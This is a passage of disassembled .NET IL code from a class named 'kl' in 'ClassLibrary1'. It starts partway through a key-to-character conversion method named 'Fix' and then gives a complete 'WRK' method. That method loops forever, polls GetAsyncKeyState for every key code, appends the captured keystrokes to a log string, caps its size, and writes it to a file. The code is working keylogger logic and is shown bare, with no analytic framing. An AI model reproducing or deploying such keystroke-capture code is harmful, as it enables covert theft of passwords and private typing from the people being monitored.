      IL_014b:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0150:  stloc.s    V_4
      IL_0152:  ldloca.s   V_4
      IL_0154:  call       instance string [mscorlib]System.Char::ToString()
      IL_0159:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_015e:  stloc.0
      IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0164:  leave.s    IL_0182

      IL_0166:  ldarg.1
      IL_0167:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_016c:  stloc.s    V_4
      IL_016e:  ldloca.s   V_4
      IL_0170:  call       instance string [mscorlib]System.Char::ToString()
      IL_0175:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_017a:  stloc.0
      IL_017b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0180:  leave.s    IL_0182

    }  // end handler
    IL_0182:  ldloc.0
    IL_0183:  ret
  } // end of method kl::Fix

  .method public instance void  WRK() cil managed
  {
    // Code size       244 (0xf4)
    .maxstack  5
    .locals init (class [mscorlib]System.Exception V_0,
             int32 V_1,
             int32 V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             string V_4,
             int32 V_5,
             class [mscorlib]System.Exception V_6)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldarg.0
      IL_0002:  ldfld      string ClassLibrary1.kl::LogsPath
      IL_0007:  call       string [mscorlib]System.IO.File::ReadAllText(string)
      IL_000c:  stfld      string ClassLibrary1.kl::Logs
      IL_0011:  leave.s    IL_0021

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0013:  dup
      IL_0014:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0019:  stloc.0
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001f:  leave.s    IL_0021

    }  // end handler
    .try
    {
      IL_0021:  ldc.i4.0
      IL_0022:  stloc.1
      IL_0023:  ldloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  add.ovf
      IL_0026:  stloc.1
      IL_0027:  ldc.i4.0
      IL_0028:  stloc.2
      IL_0029:  ldloc.2
      IL_002a:  call       int16 ClassLibrary1.kl::GetAsyncKeyState(int32)
      IL_002f:  ldc.i4     0xffff8001
      IL_0034:  bne.un.s   IL_007c

      IL_0036:  ldloc.2
      IL_0037:  stloc.3
      IL_0038:  ldarg.0
      IL_0039:  ldloc.3
      IL_003a:  callvirt   instance string ClassLibrary1.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_003f:  stloc.s    V_4
      IL_0041:  ldloc.s    V_4
      IL_0043:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0048:  ldc.i4.0
      IL_0049:  ble.s      IL_0075

      IL_004b:  ldarg.0
      IL_004c:  ldarg.0
      IL_004d:  ldfld      string ClassLibrary1.kl::Logs
      IL_0052:  ldarg.0
      IL_0053:  callvirt   instance string ClassLibrary1.kl::AV()
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_005d:  stfld      string ClassLibrary1.kl::Logs
      IL_0062:  ldarg.0
      IL_0063:  ldarg.0
      IL_0064:  ldfld      string ClassLibrary1.kl::Logs
      IL_0069:  ldloc.s    V_4
      IL_006b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0070:  stfld      string ClassLibrary1.kl::Logs
      IL_0075:  ldarg.0
      IL_0076:  ldloc.3
      IL_0077:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys ClassLibrary1.kl::lastKey
      IL_007c:  ldloc.2
      IL_007d:  ldc.i4.1
      IL_007e:  add.ovf
      IL_007f:  stloc.2
      IL_0080:  ldloc.2
      IL_0081:  ldc.i4     0xff
      IL_0086:  ble.s      IL_0029

      IL_0088:  ldloc.1
      IL_0089:  ldc.i4     0x3e8
      IL_008e:  bne.un.s   IL_00d9

      IL_0090:  ldc.i4.0
      IL_0091:  stloc.1
      IL_0092:  ldc.i4     0x5000
      IL_0097:  stloc.s    V_5
      IL_0099:  ldarg.0
      IL_009a:  ldfld      string ClassLibrary1.kl::Logs
      IL_009f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00a4:  ldloc.s    V_5
      IL_00a6:  ble.s      IL_00c8

      IL_00a8:  ldarg.0
      IL_00a9:  ldarg.0
      IL_00aa:  ldfld      string ClassLibrary1.kl::Logs
      IL_00af:  ldc.i4.0
      IL_00b0:  ldarg.0
      IL_00b1:  ldfld      string ClassLibrary1.kl::Logs
      IL_00b6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00bb:  ldloc.s    V_5
      IL_00bd:  sub.ovf
      IL_00be:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00c3:  stfld      string ClassLibrary1.kl::Logs
      IL_00c8:  ldarg.0
      IL_00c9:  ldfld      string ClassLibrary1.kl::LogsPath
      IL_00ce:  ldarg.0
      IL_00cf:  ldfld      string ClassLibrary1.kl::Logs
      IL_00d4:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_00d9:  ldc.i4.1
      IL_00da:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00df:  br         IL_0023

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00e4:  dup
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ea:  stloc.s    V_6
      IL_00ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f1:  leave.s    IL_00f3

    }  // end handler
    IL_00f3:  ret
  } // end of method kl::WRK

} // end of class ClassLibrary1.kl
 